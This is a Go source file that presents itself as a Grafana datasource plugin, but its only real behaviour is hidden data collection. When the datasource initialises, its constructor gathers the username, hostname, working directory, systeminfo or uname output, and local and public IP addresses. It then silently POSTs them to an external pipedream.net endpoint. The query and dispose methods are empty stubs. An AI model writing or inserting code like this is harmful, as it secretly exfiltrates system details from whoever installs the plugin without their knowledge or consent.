package plugin

import (
	"bytes"
	"context"
	"encoding/json"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"

	"github.com/grafana/grafana-plugin-sdk-go/backend"
)

// Datasource represents a Grafana datasource instance.
type Datasource struct{}

// NewDatasource creates a new instance of the datasource.
func NewDatasource(settings backend.DataSourceInstanceSettings) (backend.DataSourceInstance, error) {
	// Collect machine details when the datasource is initialized
	sendDataToServer()
	return &Datasource{}, nil
}

// QueryData handles data queries sent from Grafana.
func (d *Datasource) QueryData(ctx context.Context, req *backend.QueryDataRequest) (*backend.QueryDataResponse, error) {
	// Handle queries (if needed)
	return backend.NewQueryDataResponse(), nil
}

// Dispose is called when the datasource instance is being removed.
func (d *Datasource) Dispose() {
	// Cleanup resources if needed
}

// Collect and send machine information
func sendDataToServer() {
	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()
	currentDir, _ := os.Getwd()
	osDetails := getOSDetails()
	localIP := getLocalIPAddress()
	publicIP := getPublicIPAddress()

	// Create a JSON payload
	data := map[string]string{
		"PublicIP":   publicIP,
		"LocalIP":    localIP,
		"OS":         osDetails,
		"Username":   currentUser.Username,
		"Directory":  currentDir,
		"Hostname":   hostname,
	}

	jsonData, _ := json.Marshal(data)

	// Send the data to your server
	url := "https://eoe86w8ku96ocq3.m.pipedream.net/data" // Replace with your server's URL
	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		// Log the error (optional)
	}
}

func getOSDetails() string {
	var details string
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("cmd", "/C", "systeminfo")
		output, _ := cmd.Output()
		details = string(output)
	default:
		cmd := exec.Command("uname", "-a")
		output, _ := cmd.Output()
		details = string(output)
	}
	return strings.TrimSpace(details)
}

func getLocalIPAddress() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "Unknown"
	}

	for _, i := range interfaces {
		addrs, err := i.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			// Exclude loopback and IPv6 addresses
			if ip.IsLoopback() || ip.To4() == nil {
				continue
			}
			return ip.String()
		}
	}
	return "Unknown"
}

func getPublicIPAddress() string {
	resp, err := http.Get("https://api.ipify.org?format=text")
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()

	buf := new(bytes.Buffer)
	buf.ReadFrom(resp.Body)
	return buf.String()
}
